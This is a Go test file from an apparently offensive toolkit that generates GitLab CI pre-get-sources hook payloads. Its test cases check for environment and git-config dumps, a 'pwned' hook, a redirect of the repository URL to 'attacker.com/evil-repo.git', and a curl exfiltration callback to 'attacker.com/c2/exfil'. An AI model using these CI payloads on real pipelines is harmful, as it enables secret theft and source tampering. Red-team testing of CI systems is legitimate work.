package payloads

import (
	"strings"
	"testing"
)

func TestGeneratePreGetSourcesYAML(t *testing.T) {
	tests := []struct {
		name     string
		opts     PreGetSourcesOptions
		contains []string
		absent   []string
	}{
		{
			name: "default hook with env dump",
			opts: PreGetSourcesOptions{},
			contains: []string{
				"pre_get_sources_script:",
				"hooks:",
				"_HOOK()",
				"printenv | sort",
				"git config --global --list",
				"_HOOK || true",
				"allow_failure: true",
			},
			absent: []string{
				"insteadOf",
				"curl",
			},
		},
		{
			name: "custom hook script",
			opts: PreGetSourcesOptions{
				Common:     CommonOptions{JobName: "custom-hook"},
				HookScript: "echo 'pwned before source fetch'",
			},
			contains: []string{
				"custom-hook:",
				"pre_get_sources_script:",
				"echo 'pwned before source fetch'",
			},
			absent: []string{
				"_HOOK()",
			},
		},
		{
			name: "git URL redirect with callback",
			opts: PreGetSourcesOptions{
				Common:       CommonOptions{Tags: []string{"self-hosted"}},
				ModifyGitURL: "https://attacker.com/evil-repo.git",
				CallbackURL:  "https://attacker.com/c2",
			},
			contains: []string{
				"pre_get_sources_script:",
				`insteadOf "$CI_REPOSITORY_URL"`,
				"https://attacker.com/evil-repo.git",
				"https://attacker.com/c2/exfil",
				"curl",
				"tags:",
				"self-hosted",
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			y := GeneratePreGetSourcesYAML(tc.opts)
			for _, s := range tc.contains {
				if !strings.Contains(y, s) {
					t.Errorf("expected %q in output:\n%s", s, y)
				}
			}
			for _, s := range tc.absent {
				if strings.Contains(y, s) {
					t.Errorf("unexpected %q in output:\n%s", s, y)
				}
			}
			_ = mustParse(t, y)
		})
	}
}
